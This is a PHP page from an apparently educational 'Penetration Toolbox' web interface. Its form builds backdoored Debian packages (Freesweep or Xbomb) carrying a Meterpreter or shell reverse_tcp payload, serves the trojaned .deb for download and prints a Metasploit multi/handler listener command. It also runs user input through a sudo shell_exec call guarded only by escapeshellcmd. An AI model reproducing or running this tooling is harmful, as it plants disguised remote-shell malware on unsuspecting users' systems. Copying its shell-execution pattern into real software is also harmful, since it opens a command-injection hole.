<?php
/***************************************************************************
*  Copyright (C) 2024 Alexandre Perrin
*  Written by Alexandre Perrin <alexandre.perrin@supdevinci-edu.fr>.
*
*  This file is part of Penetration Toolbox, a web interface for various ethical hacking tools.
*
*  Penetration Toolbox is free software; you can redistribute it and/or modify it under the terms 
*  of the GNU General Public License as published by the Free Software Foundation, either version 3 
*  of the License, or (at your option) any later version.
*
*  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without 
*  even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
*
*  You should have received a copy of the GNU General Public License along with this program. If not, you can view it at <https://www.gnu.org/licenses/>.
****************************************************************************/

require_once 'layout.php';
require_once 'u.php';

// Function to sanitize input from the form
function sanitizeInput($data) {
    return htmlspecialchars(strip_tags(trim($data)));
}

// Function to execute shell commands securely
function executeShellCommand($command) {
    $escapedCommand = escapeshellcmd($command);
    $output = shell_exec($escapedCommand);
    return $output;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penetration Toolbox</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<section id="main" class="column">
    <h4 class="alert_info">Welcome to the Web Based Penetration Toolbox.</h4>

    <article class="module width_full">
        <header><h3>Backdooring Debian Package</h3></header>
        <div class="module_content">
            <form name="form1" method="post" enctype="multipart/form-data">
                <fieldset>
                    <label>Enter Your IP Address</label>
                    <input type="text" name="ip">
                </fieldset>
                <fieldset>
                    <label>Enter Port to Use</label>
                    <input type="text" name="port" value="4444">
                </fieldset>
                <fieldset>
                    <label>Enter Your Username</label>
                    <input type="text" name="uname" value="root">
                </fieldset>
                <fieldset>
                    <label>Choose a debian package</label><br/>
                    <input type="radio" value="p1" name="p" checked>Freesweep(x86)<br/>
                    <input type="radio" value="p2" name="p">Xbomb(x86_64)
                </fieldset>
                <fieldset>
                    <label>Linux Payload</label>
                    <input type="radio" value="linux/x86/meterpreter/reverse_tcp" name="c" checked>Linux x86 Meterpreter Reverse Tcp<br/>
                    <input type="radio" value="linux/x86/shell_reverse_tcp" name="c">Linux x86 shell reverse_tcp
                </fieldset>
                <div class="submit_link">
                    <input type="submit" name="submit" value="Start Now" class="alt_btn">
                    <input type="reset" value="Reset">
                </div>
            </form>
        </div>
        <footer>
            <div align="left">
                <h3>Thank You!</h3>
            </div>
        </footer>
    </article>

    <?php
    if (isset($_POST['submit'])) {
        $ip = sanitizeInput($_POST['ip']);
        $port = sanitizeInput($_POST['port']);
        $uname = sanitizeInput($_POST['uname']);
        $c = sanitizeInput($_POST['c']);
        $p = sanitizeInput($_POST['p']);

        if (empty($ip) || empty($port)) {
            echo "<script>alert('You have not entered data correctly.');</script>";
        } else {
            require_once 'loading.php';

            $script = $p == 'p1' ? "freesweep.sh" : "xbomb.sh";
            $pkg = $p == 'p1' ? "freesweep.deb" : "xbomb.deb";

            executeShellCommand("sudo sh cmd/debian/$script $c $ip $port $uname");

            echo "<p><b>Payload Configuration</b></p>";
            echo "<p>LHOST --> $ip</p>";
            echo "<p>LPORT --> $port</p>";
            echo "<p>PACKAGE NAME --> $pkg</p>";
            echo "<p>PAYLOAD --> $c</p>";
            echo "<p>AVAILABLE FOR DOWNLOAD @ <a href='exploits/$pkg'>Click here</a></p>";
            echo "<p>To start listener copy and paste this code into your terminal:</p>";
            echo "<pre>sudo msfcli exploit/multi/handler PAYLOAD=$c LHOST=$ip LPORT=$port E</pre>";
        }
    }
    ?>
    <div class="spacer"></div>
</section>

</body>
</html>
